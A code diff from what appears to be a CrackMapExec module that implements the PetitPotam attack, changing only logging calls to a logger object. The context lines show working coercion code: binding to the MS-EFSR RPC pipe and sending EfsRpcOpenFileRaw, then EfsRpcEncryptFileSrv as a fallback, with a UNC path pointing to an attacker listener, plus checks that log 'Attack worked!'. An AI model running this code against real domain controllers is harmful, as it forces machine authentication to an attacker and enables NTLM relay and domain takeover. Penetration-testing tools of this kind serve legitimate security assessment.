@@ -55,7 +55,7 @@ class CMEModule:
                 host = context.db.get_hosts(connection.host)[0]
                 context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, petitpotam=True)
             except Exception as e:
-                logging.debug(f"Error updating petitpotam status in database")
+                logger.debug(f"Error updating petitpotam status in database")
 
 
 class DCERPCSessionError(DCERPCException):
@@ -224,25 +224,25 @@ def coerce(username, password, domain, lmhash, nthash, target, pipe, do_kerberos
         rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)
         dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
 
-    logging.debug("[-] Connecting to %s" % binding_params[pipe]['stringBinding'])
+    logger.debug("[-] Connecting to %s" % binding_params[pipe]['stringBinding'])
     try:
         dce.connect()
     except Exception as e:
-        logging.debug("Something went wrong, check error status => %s" % str(e))
+        logger.debug("Something went wrong, check error status => %s" % str(e))
         sys.exit()
-    logging.debug("[+] Connected!")
-    logging.debug("[+] Binding to %s" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])
+    logger.debug("[+] Connected!")
+    logger.debug("[+] Binding to %s" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])
     try:
         dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
     except Exception as e:
-        logging.debug("Something went wrong, check error status => %s" % str(e))
+        logger.debug("Something went wrong, check error status => %s" % str(e))
         sys.exit()
-    logging.debug("[+] Successfully bound!")
+    logger.debug("[+] Successfully bound!")
     return dce
 
 
 def efs_rpc_open_file_raw(dce, listener):
-    logging.debug("[-] Sending EfsRpcOpenFileRaw!")
+    logger.debug("[-] Sending EfsRpcOpenFileRaw!")
     try:
         request = EfsRpcOpenFileRaw()
         request['fileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
@@ -251,24 +251,24 @@ def efs_rpc_open_file_raw(dce, listener):
 
     except Exception as e:
         if str(e).find('ERROR_BAD_NETPATH') >= 0:
-            logging.debug('[+] Got expected ERROR_BAD_NETPATH exception!!')
-            logging.debug('[+] Attack worked!')
+            logger.debug('[+] Got expected ERROR_BAD_NETPATH exception!!')
+            logger.debug('[+] Attack worked!')
             return True
         if str(e).find('rpc_s_access_denied') >= 0:
-            logging.debug('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
-            logging.debug('[+] OK! Using unpatched function!')
-            logging.debug("[-] Sending EfsRpcEncryptFileSrv!")
+            logger.debug('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
+            logger.debug('[+] OK! Using unpatched function!')
+            logger.debug("[-] Sending EfsRpcEncryptFileSrv!")
             try:
                 request = EfsRpcEncryptFileSrv()
                 request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
                 resp = dce.request(request)
             except Exception as e:
                 if str(e).find('ERROR_BAD_NETPATH') >= 0:
-                    logging.debug('[+] Got expected ERROR_BAD_NETPATH exception!!')
-                    logging.debug('[+] Attack worked!')
+                    logger.debug('[+] Got expected ERROR_BAD_NETPATH exception!!')
+                    logger.debug('[+] Attack worked!')
                     return True
                 else:
-                    logging.debug("Something went wrong, check error status => %s" % str(e))
+                    logger.debug("Something went wrong, check error status => %s" % str(e))
 
         else:
-            logging.debug("Something went wrong, check error status => %s" % str(e))
+            logger.debug("Something went wrong, check error status => %s" % str(e))
